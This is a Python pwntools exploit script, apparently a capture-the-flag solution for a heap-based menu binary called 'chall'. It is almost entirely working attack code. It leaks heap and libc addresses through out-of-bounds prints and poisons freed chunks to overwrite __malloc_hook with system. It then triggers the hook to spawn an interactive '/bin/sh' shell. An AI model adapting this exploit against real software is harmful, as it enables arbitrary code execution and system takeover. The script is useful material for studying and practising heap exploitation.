from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./chall"

elf = ELF (bin_name);
try:
  r = remote(sys.argv[1], int(sys.argv[2]))
  libc = ELF('./libc.so.6')
except:
  r = process(bin_name) #, env = {})
  libc = elf.libc


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

context.word_size = elf.elfclass


context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'

def rr ():
  r.recvuntil ("\n>")

def menu (idx):
  rr ()
  r.sendline (str(idx))

menu_count = 0
def add (count, nums):
  global menu_count
  menu_count +=1
  menu (1)
  menu (count)
  [r.sendline(str(c)) for c in nums]

def print_av (idx):
  global menu_count
  menu_count +=1
  menu (2)
  #menu (idx)
  rr ()
  r.sendline (str(idx).ljust (0x200, "\x00"))
  return r.recvline ()

def delete (idx):
  global menu_count
  menu_count +=1
  menu (3)
  menu (idx)

do_debug ("c\n")

add (1048576, [u64("/bin/sh\x00"), -1])
for _ in xrange (7):
  add (12, [0x61]*12)
  delete (1)
add (12, [0x71]*11 + [16])
add (12, [0x71]*12)
add (12, [0x71]*12)
add (12, [0x71]*12)
delete (2)
delete (3)
#print print_av(2)
heap_leak = int(print_av (652).split (": ")[1].split(".")[0])*0x10 - 0x71*2 -0x71*12
round_to = heap_leak & 0xf
if round_to == 0:
  pass
else :
  heap_leak += (0x10 - round_to)
log.info ("heap_leak: " + hex(heap_leak))
fake_addr = heap_leak - 0x13e8
log.info ("fake addr: " + hex(fake_addr))
add (12, [fake_addr] * 12)
delete (4)
delete (1)
delete (2)
libc_leak = int(print_av (656).split (": ")[1].split(".")[0])*0x61 - 0x1011 - 0x363536 + 0x100
log.info ("libc_leak: " + hex(libc_leak))
libc_leak &= 0xfffffffff000
libc_base = libc_leak + 0x801000
log.info ("libc_base: " + hex(libc_base))
fake_addr = heap_leak - 0x30

log.info ("fake addr: " + hex(fake_addr))
add (12, [fake_addr] * 2 + [0x71]*10)
add (12, [0x71]*12)
add (12, [0x71]*12)
fake_addr = libc.symbols["__malloc_hook"] + libc_base -0x23

delete (654)
delete (2)
log.info ("menu count: " + hex(menu_count))
log.info ("fake addr: " + hex(fake_addr))
add (12, [0x71]*5 + [fake_addr]* 7)
system = libc_base + libc.symbols["system"]
log.info ("system: " + hex(system))
target = system
ow = unpack_many ("\x00" * 3 + p64(0) * 1 + p64(system) + "\x00" * 5, 64, endian='little', sign=False)

add (12, ow + [-1])
add (12, ow + [-1])
pause ()
add ((libc_base - 0x801000 + 0x10)/8, [-1]) 
r.interactive ()


